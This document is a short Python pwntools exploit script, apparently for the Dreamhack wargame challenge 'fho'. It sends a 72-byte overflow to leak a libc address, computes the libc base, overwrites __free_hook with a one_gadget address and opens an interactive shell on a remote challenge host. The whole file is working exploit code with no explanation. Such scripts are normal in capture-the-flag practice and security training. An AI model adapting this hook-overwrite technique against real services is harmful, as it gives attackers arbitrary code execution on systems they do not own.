#!/usr/bin/python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+206
        b *main+247
        b *main+351
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 12485)
else:
    p = process([exe.path])
GDB()
payload = b'A'*72
sa(b'Buf: ', payload)
p.recvuntil(b'A'*72)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x21bf7
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc.address))

sla(b'write: ', f'{libc.sym.__free_hook}'.encode())
sla(b'With: ', f'{libc.address + 0x4f432}'.encode())
sla(b'free: ', b'1')
p.interactive()

